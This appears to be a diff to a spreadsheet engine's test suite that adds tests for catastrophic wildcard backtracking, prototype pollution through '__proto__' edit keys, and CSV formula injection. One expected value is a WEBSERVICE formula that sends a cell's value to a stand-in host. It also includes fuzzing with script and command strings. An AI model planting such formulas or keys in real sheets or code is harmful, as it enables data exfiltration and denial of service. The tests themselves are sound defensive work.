@@ -8,7 +8,7 @@ const path = require("path");
 const { spawnSync } = require("child_process");
 
 module.exports = function ({ E, test, script, within, ROOT }) {
-  const SHEET_JS = path.join(ROOT, "sheets/assets/sheet.js");
+  const SHEET_JS = path.join(ROOT, "sheets/assets/sheet.js"), S = require(SHEET_JS);
   const errOf = (v) => (v && v.e) || null;
 
   // --- one check for every address and range, and a budget for the work a formula can make ---
@@ -63,6 +63,21 @@ module.exports = function ({ E, test, script, within, ROOT }) {
     assert.strictEqual(errOf(within(2000, () => new E.Book({ tabs: [{ name: "T", cells: Object.assign({}, cells, { B1: "=CONCAT(A14,A14,A14)" }) }] }).value("T", "B1"))), "#VALUE!");
   });
 
+  test("a wildcard criterion can't backtrack without end, and its work is charged to the budget", () => {
+    const crit = "*a".repeat(28) + "b";
+    assert.strictEqual(within(2000, () => new E.Book({ tabs: [{ name: "T", cells: { A1: "a".repeat(40), B1: `=COUNTIF(A1,"${crit}")` } }] }).value("T", "B1")), 0);
+    const cells = {};
+    for (let r = 1; r <= 200; r++) cells["A" + r] = "a".repeat(2000);
+    for (let r = 1; r <= 50; r++) cells["B" + r] = `=COUNTIF(A1:A200,"${"*a".repeat(20)}*b")`;
+    const t0 = Date.now();
+    const vals = within(10000, () => { const b = new E.Book({ tabs: [{ name: "T", cells }] }); return Object.keys(cells).filter((a) => a[0] === "B").map((a) => b.value("T", a)); });
+    assert.strictEqual(vals[0], 0);
+    assert.ok(vals.some((v) => errOf(v) === "#CALC!"), "the matching wasn't charged");
+    assert.ok(Date.now() - t0 < 4000, `took ${Date.now() - t0} ms`);
+    assert.strictEqual(new E.Book({ tabs: [{ name: "T", cells: { A1: "Bike stock", A2: "bike", A3: "Parts", B1: '=COUNTIF(A1:A3,"bike*")', B2: '=COUNTIF(A1:A3,"?ike")', B3: '=COUNTIF(A1:A3,"*s*")' } }] }).value("T", "B1"), 2);
+    assert.strictEqual(new E.Book({ tabs: [{ name: "T", cells: { A1: "Bike stock", A2: "bike", A3: "Parts", B2: '=COUNTIF(A1:A3,"?ike")' } }] }).value("T", "B2"), 1);
+    assert.strictEqual(new E.Book({ tabs: [{ name: "T", cells: { A1: "Bike stock", A2: "bike", A3: "Parts", B3: '=COUNTIF(A1:A3,"*s*")' } }] }).value("T", "B3"), 2);
+  });
   // --- a person's record ---
   test("a malformed edit in a person's record is skipped; the good ones still count", () => {
     const edits = {
@@ -74,12 +89,38 @@ module.exports = function ({ E, test, script, within, ROOT }) {
     assert.deepStrictEqual(ok, [{ tab: "budget", a: "B2", v: 120, at: "2026-11-14T10:00:00Z", t: Date.parse("2026-11-14T10:00:00Z") }]);
     for (const bad of [null, "edits", [1, 2], 5]) assert.deepStrictEqual(JSON.parse(JSON.stringify(E.cleanEdits(bad))), []);
     const ui = script("sheet-ui");
-    assert.match(ui, /E\.cleanEdits\(rec\.data && rec\.data\.edits\)/);
+    assert.match(script("sheet-engine"), /cleanEdits\(rec\.data && rec\.data\.edits\)/); // mergeEdits, which the page's overlay uses
     // When loading fails, the sheet as saved is drawn: no one's records, so a bad one can't be drawn again.
     assert.match(ui, /\.catch\(function \(e\) \{[^}]*state\.others = \[\]; state\.me = null;/);
   });
 
+  test("a person's edit to a tab that isn't there, __proto__ included, reaches nothing", () => {
+    const at = "2026-11-14T10:00:00Z", tabs = [{ name: "Budget", cells: { A1: "Item" } }];
+    const recs = [{ data: { edits: JSON.parse(`{"__proto__!B1": {"v": 777, "at": "${at}"}, "constructor!B1": {"v": 1, "at": "${at}"}, "Nope!B1": {"v": 2, "at": "${at}"}, "Budget!B2": {"v": 5, "at": "${at}"}}`) }, author_name: "Sam" }];
+    const ov = E.mergeEdits(recs, tabs, () => 0);
+    assert.strictEqual(({}).B1, undefined);
+    assert.strictEqual(Object.getPrototypeOf(E.Book.prototype).B1, undefined); // the engine's own realm too
+    assert.deepStrictEqual(Object.keys(ov), ["budget"]);
+    assert.deepStrictEqual(JSON.parse(JSON.stringify(ov.budget.B2)), { v: 5, at, t: Date.parse(at), peer: true, by: "Sam" });
+    const b = new E.Book({ tabs }, ov);
+    assert.strictEqual(b.value("Budget", "B1"), null);
+    assert.strictEqual(errOf(b.value("Budget", "C1") || new E.Book({ tabs: [{ name: "Budget", cells: { C1: "=constructor!A1+toString!A1" } }] }).value("Budget", "C1")), "#REF!");
+    assert.match(script("sheet-ui"), /E\.mergeEdits\(/);
+  });
   // --- downloads ---
+  function parseCsv(text) { // RFC 4180: quoted fields, "" inside them
+    const rows = [[]]; let f = "", q = false;
+    for (let i = 0; i < text.length; i++) {
+      const ch = text[i];
+      if (q) { if (ch === '"' && text[i + 1] === '"') { f += '"'; i++; } else if (ch === '"') q = false; else f += ch; }
+      else if (ch === '"') q = true;
+      else if (ch === ",") { rows[rows.length - 1].push(f); f = ""; }
+      else if (ch === "\r" && text[i + 1] === "\n") { rows[rows.length - 1].push(f); f = ""; rows.push([]); i++; }
+      else f += ch;
+    }
+    rows.pop();
+    return rows;
+  }
   const unzipText = (bytes) => Buffer.from(bytes).toString("utf8"); // a stored zip: the parts are plain text
   function exportBook() {
     const data = { title: "T", currency: "GBP", locale: "en-GB", tabs: [{ name: "Budget", cells: {
@@ -106,13 +147,72 @@ module.exports = function ({ E, test, script, within, ROOT }) {
     assert.match(xml, /<c r="D1" s="\d+" t="inlineStr"><is><t xml:space="preserve">@SUM\(1\+1\)<\/t>/);
   });
   test("CSV: text starting with = + - or @ gets a leading apostrophe; numbers don't", () => {
-    const rows = E.csv(exportBook(), "Budget").trim().split("\r\n").map((l) => l.split(","));
+    const rows = parseCsv(E.csv(exportBook(), "Budget"));
     assert.strictEqual(rows[0][3], "'@SUM(1+1)");
     assert.strictEqual(rows[1][3], "'-5 apples");
     assert.strictEqual(rows[2][3], "-5");
     assert.strictEqual(rows[3][3], "'+44 20 7946 0000");
     assert.strictEqual(rows[4][3], "'=1+1");
     assert.strictEqual(rows[0][2], "30");
+    // A formula the engine doesn't run, or another person's, goes in as its text, after an apostrophe.
+    assert.strictEqual(rows[1][2], `'=WEBSERVICE("https://example.invalid/?value="&B1)`);
+    assert.strictEqual(rows[3][2], `'=FILTERXML(B1,"x")`);
+    assert.strictEqual(rows[0][4], "'=SUM(B1:B2)");
+    assert.strictEqual(rows[2][4], "20"); // your own formula: its value, as for the sheet's
+  });
+
+  // --- property: random formulas and records, each case under a time limit ---
+  test("property: 2,000 random sheets of formulas and people's records each finish in 3 s, with plain values and no prototype touched", () => {
+    let seed = 20261114;
+    const rnd = () => { seed = (seed + 0x6D2B79F5) | 0; let t = Math.imul(seed ^ (seed >>> 15), 1 | seed); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296; };
+    const pick = (a) => a[Math.floor(rnd() * a.length)];
+    const REFS = ["A1", "B2", "$C$3", "C$4", "Z9", "A10000", "A10001", "ALL1", "ALM1", "A9007199254740992", "XFD1048576", "A0", "A:A", "B:C",
+      "A1:B5", "A1:ALL10000", "A1:A200", "'Q1 plan'!A1:B3", "Budget!A1:A5", "__proto__!A1", "constructor!B2", "toString!A1:A3", "'x]'!A1", "Nope!A1"];
+    const FNS = [...E.NAMES, "WEBSERVICE", "INDIRECT", "HYPERLINK", "constructor", "__proto__", "toString", "valueOf", "hasOwnProperty", "_xlfn.CONCAT"];
+    const STR = ['"*a*a*a*a*a*a*a*a*a*a*b"', '"?"', '"<>"', '">=5"', '"=1+1"', '"@cmd"', '"' + "x".repeat(300) + '"', '""', '"a""b"', '"<script>"', '"__proto__"', '"a*"', '"*"'];
+    const NUM = ["0", "1", "-1", "1e308", "1e-308", "9007199254740993", "3.5", "100%"];
+    const JUNK = ['"', "(", ")", "!", ":", "$", "'", "A", "1", ",", "*", "[", "|", "#", "&", "~", "\\", "=", ";"];
+    function expr(d) {
+      const k = d > 3 ? rnd() * 3 : rnd() * 7.2;
+      if (k < 1) return rnd() < 0.03 ? "A1:T10000" : pick(REFS);
+      if (k < 2) return pick(NUM);
+      if (k < 3) return pick(STR);
+      if (k < 4) return pick(FNS) + "(" + Array.from({ length: Math.floor(rnd() * 4) }, () => expr(d + 1)).join(",") + ")";
+      if (k < 5) return expr(d + 1) + pick(["+", "-", "*", "/", "^", "&", "=", "<>", "<", ">="]) + expr(d + 1);
+      if (k < 6) return pick(["-", "+", "("]) + expr(d + 1) + (rnd() < 0.5 ? ")" : "%");
+      if (k < 7) return "(".repeat(1 + Math.floor(rnd() * 3)) + expr(d + 1) + ")".repeat(Math.floor(rnd() * 4));
+      return Array.from({ length: 1 + Math.floor(rnd() * 12) }, () => pick(JUNK)).join("");
+    }
+    const at = () => pick(["2026-11-14T10:00:00Z", "2099-01-01T00:00:00Z", "bad", "", 5, null]);
+    const KEYS = ["Budget!B3", "budget!C4", "__proto__!B1", "constructor!A1", "Nope!A1", "Budget!ZZZ1", "Budget!a7", "Budget!A0", "!A1", "Budget!", "Q1 plan!B2", "'Q1 plan'!B2", "Budget!B9", "hasOwnProperty!A1"];
+    const edit = () => pick([null, 1, "x", [1], { v: "=" + expr(0), at: at() }, { v: pick([5, "t", true, null, 1e308]), at: at() }, { v: { x: 1 }, at: at() }, { v: [1], at: at() }, { at: at() }]);
+    const record = () => pick([null, "junk", { data: "junk" }, { data: { edits: [1, 2] } },
+      { mine: rnd() < 0.3, author_name: pick(["Sam", "<b>x</b>", undefined]), data: { edits: Object.fromEntries(Array.from({ length: 1 + Math.floor(rnd() * 5) }, () => [pick(KEYS), edit()])) } }]);
+    const realmProto = Object.getPrototypeOf(E.Book.prototype), before = Object.getOwnPropertyNames(realmProto).join(), mainBefore = Object.getOwnPropertyNames(Object.prototype).join();
+    const plain = (v) => v === null || typeof v === "string" || typeof v === "boolean" || (typeof v === "number" && isFinite(v)) || (E.isErr(v) && Object.keys(v).length === 1);
+    let slowest = 0, slowCase = -1;
+    for (let n = 0; n < 2000; n++) {
+      const t0 = Date.now();
+      const bad = within(3000, () => {
+        const cells = { A1: "a".repeat(2000), A2: 3, A3: "2026-11-01", A4: true, A5: "=1+1" };
+        for (let r = 1; r <= 8; r++) cells["B" + r] = "=" + expr(0);
+        if (rnd() < 0.2) cells[pick(["ZZZ9999999", "__proto__", "constructor", "a1", "A0"])] = "=" + expr(0);
+        const tabs = [{ name: "Budget", freeze: 1, cols: [{ w: 100, fmt: pick(["money", "constructor", "__proto__", "month"]) }], cells,
+          lists: [{ range: pick(REFS), values: ["a", "b"] }], checks: [pick(REFS)], rules: [{ range: pick(REFS), if: "=" + expr(0), style: pick(["bad", "constructor", "__proto__"]) }],
+          charts: [{ type: "bar", labels: pick(REFS), series: [{ name: "s", range: pick(REFS) }] }] }, { name: "Q1 plan", cells: { A1: 1, B2: "=" + expr(0) } }];
+        const ov = E.mergeEdits(Array.from({ length: Math.floor(rnd() * 4) }, record), tabs, () => 0);
+        const b = new E.Book({ currency: pick(["GBP", "constructor", "__proto__"]), locale: "en-GB", tabs }, ov);
+        E.report(b); E.xlsx(b); E.csv(b, "Budget"); E.drawSize(b, b.tabs.budget);
+        for (const t of ["Budget", "Q1 plan"]) for (const a of Object.keys(b.raw[t.toLowerCase()])) { const v = b.value(t, a); if (!plain(v)) return `${t}!${a} = ${String(v)} from ${JSON.stringify(b.raw[t.toLowerCase()][a])}`; }
+        E.applyDelta({ tabs: [{ name: "Budget", cells: {} }] }, JSON.stringify({ tab: "Budget", cells: { [pick(KEYS).split("!")[1] || "A1"]: "=" + expr(0) } }));
+        return null;
+      });
+      assert.strictEqual(bad, null, `case ${n}: ${bad}`);
+      if (Date.now() - t0 > slowest) { slowest = Date.now() - t0; slowCase = n; }
+      assert.strictEqual(Object.getOwnPropertyNames(realmProto).join(), before, `case ${n} touched Object.prototype`);
+      assert.strictEqual(Object.getOwnPropertyNames(Object.prototype).join(), mainBefore, `case ${n} touched Object.prototype`);
+    }
+    console.log(`     slowest case: ${slowest} ms (case ${slowCase})`);
   });
 
   // --- sheet.js ---
@@ -140,13 +240,27 @@ module.exports = function ({ E, test, script, within, ROOT }) {
     assert.match(r.stdout, /saved: The budget/);
     assert.strictEqual(f.sent(), false);
   });
+  test("sheet.js: a first save that fails exits non-zero, and the next push saves it", () => {
+    const f = folder(["deploy"]);
+    const r = f.run("push", "Writing Budget");
+    assert.notStrictEqual(r.status, 0, r.stdout + r.stderr);
+    fs.writeFileSync(path.join(f.dir, "bin", "spacesheep"), `#!/bin/sh\ncat >/dev/null\necho '{"tabs_open":1}'\n`);
+    const again = f.run("push");
+    assert.strictEqual(again.status, 0, again.stdout + again.stderr);
+    assert.match(again.stdout, /saved it/);
+  });
+  test("sheet.js refuses a fill range off the sheet before expanding it", () => {
+    assert.throws(() => within(2000, () => S.fill({ "A9007199254740992:A9007199254740992": 1 }, "t")), /off the sheet/);
+    assert.throws(() => within(2000, () => S.fill({ "A1:A10001": 1 }, "t")), /off the sheet/);
+    assert.strictEqual(Object.keys(S.fill({ "A1:A3": 1 }, "t")).length, 3);
+  });
   test("sheet.js refuses a cell off the sheet before sending anything", () => {
     const f = folder([]);
     fs.mkdirSync(path.join(f.dir, "w", "cells"));
     fs.writeFileSync(path.join(f.dir, "w", "cells", "01-x.json"), JSON.stringify({ tab: "Budget", cells: { "A2:A10002": "=1" } }));
     const r = f.run("push");
     assert.notStrictEqual(r.status, 0);
-    assert.match(r.stderr, /Budget!A10001 isn't a cell on the sheet/);
+    assert.match(r.stderr, /cells\/01-x\.json: A2:A10002 is off the sheet/);
     assert.strictEqual(f.sent(), false);
   });
   test("sheet.js refuses a drop-down, tick, highlight or chart range off the sheet, which the page would drop", () => {
